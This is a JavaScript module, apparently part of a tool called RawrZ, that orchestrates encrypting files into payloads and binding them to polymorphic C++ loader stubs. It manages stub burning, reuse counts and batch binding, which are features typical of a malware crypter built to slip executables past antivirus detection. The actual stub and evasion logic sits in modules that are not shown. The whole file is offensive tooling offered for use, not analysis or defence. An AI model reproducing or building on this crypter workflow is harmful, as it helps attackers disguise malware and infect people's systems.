/**
 * RawrZ Encryption Workflow Controller
 * Orchestrates separated encryption and polymorphic stub management
 * Implements burn-and-reuse strategy for maximum efficiency
 */

const SeparatedEncryptor = require('./separated-encryptor');
const PolymorphicStubManager = require('./polymorphic-stub-manager');
const path = require('path');

class EncryptionWorkflowController {
    constructor() {
        this.name = 'EncryptionWorkflowController';
        this.version = '2.0.0';
        
        this.encryptor = new SeparatedEncryptor();
        this.stubManager = new PolymorphicStubManager();
        
        this.workflowHistory = [];
        this.activeWorkflows = new Map();
    }

    /**
     * Execute complete separated workflow
     * 1. Encrypt file (no stub)
     * 2. Generate/burn stubs
     * 3. Bind payload to 4th stub
     * 4. Store for reuse
     */
    async executeCompleteWorkflow(filePath, options = {}) {
        console.log('\n=== STARTING SEPARATED ENCRYPTION WORKFLOW ===');
        console.log(`[WORKFLOW] Processing: ${path.basename(filePath)}`);
        
        const workflowId = Math.random().toString(36).substr(2, 9);
        const workflow = {
            id: workflowId,
            filePath: filePath,
            startTime: new Date(),
            steps: []
        };

        try {
            // STEP 1: Pure encryption (no stub generation)
            console.log('\n[STEP 1] PURE ENCRYPTION (NO STUB)');
            console.log('=====================================');
            
            const encryptionMethod = options.encryptionMethod || 'aes-256-gcm';
            console.log(`[ENCRYPT] Method: ${encryptionMethod}`);
            console.log('[ENCRYPT] Generating encrypted payload only...');
            
            const encryptedPayload = await this.encryptor.encryptFile(filePath, {
                method: encryptionMethod,
                outputPath: options.encryptedOutputPath
            });
            
            workflow.steps.push({
                step: 'encryption',
                completed: true,
                payloadId: encryptedPayload.payloadId,
                method: encryptionMethod,
                size: encryptedPayload.size
            });

            // STEP 2: Polymorphic stub generation and burning
            console.log('\n[STEP 2] POLYMORPHIC STUB MANAGEMENT');
            console.log('====================================');
            
            const stubType = options.stubType || 'cpp-loader';
            console.log(`[STUB] Type: ${stubType}`);
            console.log('[STUB] Executing burn-and-load strategy...');
            
            const boundStub = await this.stubManager.executeBurnAndLoadWorkflow(encryptedPayload);
            
            workflow.steps.push({
                step: 'stub_management',
                completed: true,
                stubId: boundStub.id,
                stubType: boundStub.type,
                reuseReady: boundStub.readyForReuse
            });

            // STEP 3: Finalize workflow
            console.log('\n[STEP 3] WORKFLOW FINALIZATION');
            console.log('===============================');
            
            const finalResult = {
                workflowId: workflowId,
                encryptedPayload: encryptedPayload,
                boundStub: boundStub,
                canReuse: true,
                timestamp: new Date().toISOString()
            };

            workflow.steps.push({
                step: 'finalization',
                completed: true,
                canReuse: true
            });

            workflow.endTime = new Date();
            workflow.success = true;
            this.workflowHistory.push(workflow);

            console.log('\n=== WORKFLOW COMPLETE ===');
            console.log(`[SUCCESS] Workflow ${workflowId} completed successfully`);
            console.log(`[PAYLOAD] Encrypted payload ID: ${encryptedPayload.payloadId}`);
            console.log(`[STUB] Bound stub ID: ${boundStub.id}`);
            console.log(`[REUSE] Ready for reuse: ${boundStub.readyForReuse}`);
            
            return finalResult;

        } catch (error) {
            workflow.error = error.message;
            workflow.success = false;
            workflow.endTime = new Date();
            this.workflowHistory.push(workflow);
            
            console.error(`[ERROR] Workflow ${workflowId} failed: ${error.message}`);
            throw error;
        }
    }

    /**
     * Quick encrypt-only operation (no stub binding)
     */
    async quickEncryptOnly(filePath, method = 'aes-256-gcm') {
        console.log('\n=== QUICK ENCRYPT-ONLY MODE ===');
        console.log(`[QUICK] File: ${path.basename(filePath)}`);
        console.log(`[QUICK] Method: ${method}`);
        console.log('[QUICK] No stub generation - pure encryption');
        
        const result = await this.encryptor.encryptFile(filePath, { method: method });
        
        console.log(`[QUICK-DONE] Payload ID: ${result.payloadId}`);
        console.log('[QUICK-DONE] Encrypted payload ready');
        
        return result;
    }

    /**
     * Reuse existing encrypted payload with new stub
     */
    async reuseEncryptedPayload(payloadId, newStubType = 'cpp-loader') {
        console.log('\n=== PAYLOAD REUSE MODE ===');
        console.log(`[REUSE] Payload ID: ${payloadId}`);
        
        const payload = this.encryptor.getStoredPayload(payloadId);
        if (!payload) {
            throw new Error(`Payload ${payloadId} not found`);
        }

        console.log(`[REUSE] Found payload: ${payload.method} encryption, ${payload.size} bytes`);
        console.log('[REUSE] Generating fresh stub for reuse...');
        
        const newStub = await this.stubManager.generatePolymorphicStub(newStubType);
        const boundStub = await this.stubManager.bindPayloadToStub(newStub.id, payload);
        
        console.log(`[REUSE-DONE] New stub ${boundStub.id} bound to existing payload`);
        
        return {
            payloadId: payloadId,
            stubId: boundStub.id,
            reuseCount: boundStub.reuseCount,
            ready: true
        };
    }

    /**
     * Reuse existing bound stub (your efficiency strategy)
     */
    async reuseExistingStub(stubId) {
        console.log('\n=== STUB REUSE MODE ===');
        console.log(`[REUSE-STUB] Stub ID: ${stubId}`);
        
        const reusedStub = await this.stubManager.reuseStub(stubId);
        
        console.log(`[REUSE-STUB] Reuse count: ${reusedStub.reuseCount}/${reusedStub.maxReuse}`);
        
        if (reusedStub.retired) {
            console.log('[REUSE-STUB] Stub retired after max reuse');
        }
        
        return reusedStub;
    }

    /**
     * Batch encrypt multiple files with shared stub strategy
     */
    async batchEncryptWithSharedStubs(filePaths, options = {}) {
        console.log('\n=== BATCH ENCRYPTION MODE ===');
        console.log(`[BATCH] Processing ${filePaths.length} file(s)`);
        
        const results = [];
        const encryptionMethod = options.method || 'aes-256-gcm';
        
        // Encrypt all files first (pure encryption)
        console.log('[BATCH] Phase 1: Pure encryption of all files');
        const encryptedPayloads = [];
        
        for (const filePath of filePaths) {
            console.log(`[BATCH-ENCRYPT] ${path.basename(filePath)}`);
            const payload = await this.encryptor.encryptFile(filePath, { method: encryptionMethod });
            encryptedPayloads.push(payload);
        }

        // Generate shared stubs for batch
        console.log('[BATCH] Phase 2: Generating shared polymorphic stubs');
        const sharedStubs = [];
        const stubCount = Math.min(encryptedPayloads.length, 3); // Max 3 shared stubs
        
        for (let i = 0; i < stubCount; i++) {
            const stub = await this.stubManager.generatePolymorphicStub('cpp-loader');
            sharedStubs.push(stub);
        }

        // Bind payloads to stubs (round-robin)
        console.log('[BATCH] Phase 3: Binding payloads to stubs');
        for (let i = 0; i < encryptedPayloads.length; i++) {
            const stubIndex = i % sharedStubs.length;
            const stub = sharedStubs[stubIndex];
            
            const boundStub = await this.stubManager.bindPayloadToStub(stub.id, encryptedPayloads[i]);
            
            results.push({
                filePath: filePaths[i],
                payloadId: encryptedPayloads[i].payloadId,
                stubId: boundStub.id,
                sharedStubIndex: stubIndex
            });
        }

        console.log(`[BATCH-DONE] ${results.length} files processed with ${sharedStubs.length} shared stubs`);
        return results;
    }

    /**
     * Get workflow statistics
     */
    getWorkflowStats() {
        const encryptorStats = this.encryptor.getStats();
        const stubStats = this.stubManager.getWorkflowStats();
        
        return {
            totalWorkflows: this.workflowHistory.length,
            successfulWorkflows: this.workflowHistory.filter(w => w.success).length,
            encryptor: encryptorStats,
            stubManager: stubStats,
            efficiency: {
                reuseRatio: stubStats.efficiency,
                avgWorkflowTime: this.calculateAvgWorkflowTime()
            }
        };
    }

    /**
     * Calculate average workflow time
     */
    calculateAvgWorkflowTime() {
        const completedWorkflows = this.workflowHistory.filter(w => w.endTime);
        if (completedWorkflows.length === 0) return '0ms';
        
        const totalTime = completedWorkflows.reduce((sum, w) => {
            return sum + (new Date(w.endTime) - new Date(w.startTime));
        }, 0);
        
        return Math.round(totalTime / completedWorkflows.length) + 'ms';
    }

    /**
     * List reuseable resources
     */
    listReuseableResources() {
        return {
            encryptedPayloads: this.encryptor.listStoredPayloads(),
            reuseableStubs: this.stubManager.listReuseableStubs(),
            workflowHistory: this.workflowHistory.map(w => ({
                id: w.id,
                success: w.success,
                steps: w.steps?.length || 0,
                duration: w.endTime ? new Date(w.endTime) - new Date(w.startTime) : null
            }))
        };
    }

    /**
     * Clean up old resources
     */
    async cleanupOldResources(maxAge = 24 * 60 * 60 * 1000) {
        console.log('[CLEANUP] Starting resource cleanup...');
        
        const clearedPayloads = this.encryptor.clearOldPayloads(maxAge);
        
        // Clean old workflow history
        const now = Date.now();
        const oldWorkflows = this.workflowHistory.filter(w => {
            const age = now - new Date(w.startTime).getTime();
            return age > maxAge;
        });
        
        this.workflowHistory = this.workflowHistory.filter(w => {
            const age = now - new Date(w.startTime).getTime();
            return age <= maxAge;
        });

        console.log(`[CLEANUP] Cleared ${clearedPayloads} old payload(s) and ${oldWorkflows.length} old workflow(s)`);
        
        return {
            clearedPayloads: clearedPayloads,
            clearedWorkflows: oldWorkflows.length
        };
    }
}

module.exports = EncryptionWorkflowController;